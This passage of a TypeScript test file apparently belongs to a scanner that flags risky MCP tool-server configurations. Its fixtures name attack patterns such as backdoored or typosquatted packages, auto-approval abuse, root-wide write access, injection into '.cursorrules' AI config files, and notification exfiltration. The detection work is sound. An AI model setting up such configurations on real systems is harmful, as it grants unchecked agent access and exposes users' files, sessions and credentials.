      command: 'chatgpt-mcp-bridge',
      args: [],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('ChatGPT'))).toBe(true)
  })

  it('detects GitHub Copilot agent mode MCP injection', () => {
    const server: MCPServer = {
      name: 'copilot-mcp',
      command: 'copilot-mcp-server',
      args: [],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Copilot'))).toBe(true)
  })

  it('detects OAuth PKCE bypass via plain challenge method (CVE-2026-44198)', () => {
    const server: MCPServer = {
      name: 'oauth-server',
      command: 'node',
      args: ['server.js', '--pkce-method=plain'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('PKCE') || f.description.includes('CVE-2026-44198'))).toBe(true)
  })

  it('detects MCP gateway/proxy credential aggregation', () => {
    const server: MCPServer = {
      name: 'mcp-gateway',
      command: 'mcp-gateway',
      args: [],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('gateway') || f.description.includes('proxy'))).toBe(true)
  })

  it('detects Deno JSR typosquatting MCP packages', () => {
    const server: MCPServer = {
      name: 'deno-mcp',
      command: 'deno',
      args: ['run', 'jsr:@mcp-servers/fetch'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('JSR') || f.description.includes('typosquat'))).toBe(true)
  })

  it('detects compromised mcp-server-fetch variants', () => {
    const server: MCPServer = {
      name: 'fetch-server',
      command: 'npx',
      args: ['mcp-server-fetcher'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('fetch') || f.description.includes('SSRF'))).toBe(true)
  })

  it('detects MCP auto-approval exploitation', () => {
    const server: MCPServer = {
      name: 'auto-server',
      command: 'node',
      args: ['server.js', '--auto-approve'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('auto-approv'))).toBe(true)
  })

  it('detects malicious PyPI MCP server packages', () => {
    const server: MCPServer = {
      name: 'pypi-mcp',
      command: 'uvx',
      args: ['mcp-server-pwn'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('PyPI') || f.description.includes('setup.py'))).toBe(true)
  })

  it('detects MCP server with excessive filesystem scope', () => {
    const server: MCPServer = {
      name: 'fs-server',
      command: 'node',
      args: ['server.js', '--allow-write=/'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('filesystem') || f.description.includes('Excessive Agency'))).toBe(true)
  })

  it('detects MCP server targeting AI config files', () => {
    const server: MCPServer = {
      name: 'config-inject',
      command: 'node',
      args: ['server.js', '.cursorrules'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('.cursorrules') || f.description.includes('AI assistant'))).toBe(true)
  })

  it('detects browser automation MCP with user profile access', () => {
    const server: MCPServer = {
      name: 'browser-mcp',
      command: 'node',
      args: ['server.js', '--user-data-dir'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('browser') || f.description.includes('session'))).toBe(true)
  })

  it('detects Streamable HTTP transport downgrade to HTTP', () => {
    const server: MCPServer = {
      name: 'insecure-transport',
      command: 'node',
      args: ['server.js', '--no-tls'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('HTTP') || f.description.includes('TLS'))).toBe(true)
  })

  it('detects MCP notification abuse patterns', () => {
    const server: MCPServer = {
      name: 'notify-server',
      command: 'node',
      args: ['server.js', '--enable-notifications'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('notification') || f.description.includes('exfiltration'))).toBe(true)
  })

  it('detects Go module vanity import path attacks', () => {
    const server: MCPServer = {
      name: 'go-mcp',
      command: 'go',
      args: ['run', 'github.com/mcp-servers/backdoor'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Go module') || f.description.includes('vanity'))).toBe(true)
  })
})

describe('getKnownThreatCount', () => {
  it('returns a number greater than zero', () => {
    expect(getKnownThreatCount()).toBeGreaterThan(0)
  })

  it('returns at least 210 threats (current database size)', () => {
    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(210)
  })

  it('returns a consistent count', () => {
    const first = getKnownThreatCount()
    const second = getKnownThreatCount()
    expect(first).toBe(second)
  })
})
